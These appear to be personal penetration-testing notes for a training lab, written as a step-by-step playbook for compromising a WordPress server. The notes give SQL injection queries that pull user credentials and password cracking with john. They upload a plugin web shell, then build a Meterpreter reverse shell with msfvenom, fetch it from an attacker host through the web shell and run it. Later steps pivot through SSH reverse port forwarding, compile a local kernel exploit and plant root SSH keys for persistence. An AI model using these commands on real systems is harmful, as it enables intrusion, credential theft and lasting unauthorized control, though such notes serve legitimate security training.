Public Enumeration
	May have to add the domain to etc/hosts file
		sudo cp /etc/hosts /etc/hosts.orig
		sudo bash -c " echo '10.11.1.250 sandbox.local' >> /etc/hosts".

	Scan with Nmap


Web App Enum
	Ferobuster
	Source checking
	XSS checking
	Burpsuite
	Enum Plugins and known vulns
	Admin interfaces


SQL Injection
	
	table_name FROM information_schema.tables
	column_name FROM information_schema.columns WHERE table_name='wp_users'
	user_login FROM wp_users
	user_pass FROM wp_users


Password Cracking

	echo 'Password' > pass.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt


Admin Interface Enum

	'Info' tab should show system and database info
	For WP plugin shell
		cd /usr/share/seclists/Web-Shells/WordPress
		sudo zip plugin-shell.zip plugin-shell.php
		curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
	
	For getting Meterpreter shell
		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=AttackerIP LPORT=AttackerPort -f elf > shell.elf
		sudo python3 -m http.server 80
		curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://AttackerIP/shell.elf
		curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
		sudo msfconsole -q -x "use exploit/multi/handler;\
        	set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
			set LHOST AttackerIP;\
			set LPORT AttackerPort;\
			run"
		curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf



Web Server Post-Exploit Enum

	ifconfig
		look for any other NICs, or any other subnets this PC would talk to
	hostname
	cat /etc/issue
	cat /proc/version
	pwd
	cd /var/www/html && ls -alh
	cat config.php
	uname -a
	netstat -tulpn

	Other subnets? Wanna run a port scan?
		#!/bin/bash
		host=10.5.5.11 (Or Target IP)
		for port in {1..65535}; do
		    timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
		        echo "port $port is open"
		done
		echo "Done"


Pivotting

	In this example, we'll set up a reverse port forward

		Kali = Attacking Machine
		Abby = Compromised WebServer / WordPress Server
		Betty = Targeted Database Server

	Abby is a webserver that was compromised with a no-login account - www-data. To pivot to Betty, we'll use reverse port forwarding. If we had root access and/or could log into Abby, then we could do it differently.

	The below command would use Abby's ssh client to open port 1122 and 13306 on Kali and would point to 22 and 3306 on Betty.

		(To be run on Abby): ssh -f -N -R 1122:(Betty's IP):22 -R 13306:(Betty's IP):3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa Kali@IPAddress

	BUT! Before we do this, we need to make some ssh keys so Kali won't ask Abby for a password.
	To do this, we'll generate the key on Abby, and configure Kali to accept the key and restrict what Abby is allowed to do through SSH

		(To be run on Abby):
		mkdir keys
		cd keys
		ssh-keygen
		/tmp/keys/id_rsa
			(Enter Passphrase)
		cat id_rsa.pub

	To prevent anyone from using Abby to run commands on Kali, we add the below into the ~/.ssh/authorized_keys file on Kali

		from="(NAT IP / Firewall / DMZ IP)",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ... www-data@Abby



	Make the keys on Abby, then add the above command into the ~/.ssh/authorized_keys file on Kali, then run the ssh remote port forwarding command on Abby

		test with "sudo netstat -tulpn" to look for listening ports.
		We should now be able to hit ports 22 and 3306 on Betty by aiming at 127.0.0.1:1122 and 127.0.0.1:13306 on Kali



	TL:DR


		Kali = Attacking Machine
		Abby = Compromised WebServer / WordPress Server
		Betty = Targeted Database Server


		Run this on Abby

			mkdir keys
			cd keys
			ssh-keygen
			/tmp/keys/id_rsa
				(Enter Passphrase)
			cat id_rsa.pub

		Then add this to the Kali ~/.ssh/authorized_keys file

			from="(NAT IP / Firewall / DMZ IP)",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ...public ssh-key... www-data@Abby

		Then run this command from the WebServer

			ssh -f -N -R 1122:(Betty's IP):22 -R 13306:(Betty's IP):3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa Kali@KaliIP

		test with "sudo netstat -tulpn" to look for listening ports. Should now be able to hit Betty from Kali


Database Enum


	Login to Database using valid creds from other enumeration

		SHOW Grants;
			see permissions on the account
		SHOW variables;
			see hostname, plugin_dir, tmpdir, version, version_compile_machine

		Searchsploit time!

			While searching through exploits, see if the exploit is basically just running certain system commands. If so, we can run them manually.



Linux Privesc

	ifconfig
		look for any other NICs, or any other subnets this PC would talk to
	hostname
	cat /etc/issue
	cat /proc/version
	pwd
	cd /var/www/html && ls -alh
	cat config.php
	uname -a
	netstat -tulpn

	Hunt for kernel exploits. Check for compiler on the box for more consistent compiling
		gcc
		find / -name gcc -type f 2>/dev/null


	If not, God's will be done. Fire away.
		cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
		gcc 45010.c -o 45010
		upload /home/kali/45010 /tmp/
		cd /tmp
		chmod +x 45010
		./45010

SSH KeyGen

	If you have root access and want to SSH in use the below


	No ssh keys yet?

	From the attacking box:
		ssh-keygen
		cat:~/.ssh/id_rsa.pub


	Made the keys? Already had some from before?

	From the compromised box:
		mkdir /root/.ssh
		echo "ssh-rsa ...Kali PubKey... kali@attacker" > /root/.ssh/authorized_keys


	Then ssh into the compromised box as root. 




High-Level Playbook




Public Enumeration

	
	sudo nmap -sC -sS -p0-65535 sandbox.local


Web App Enum

	
	Ferobuster to enum Directories


		WordPress? Use below for more accurate results
			wpscan --url sandbox.local --enumerate ap,at,cb,dbe

		Search searchsploit carefully for plugins


	SQL Injection


		table_name FROM information_schema.tables
		column_name FROM information_schema.columns WHERE table_name='wp_users'
		user_login FROM wp_users
		user_pass FROM wp_users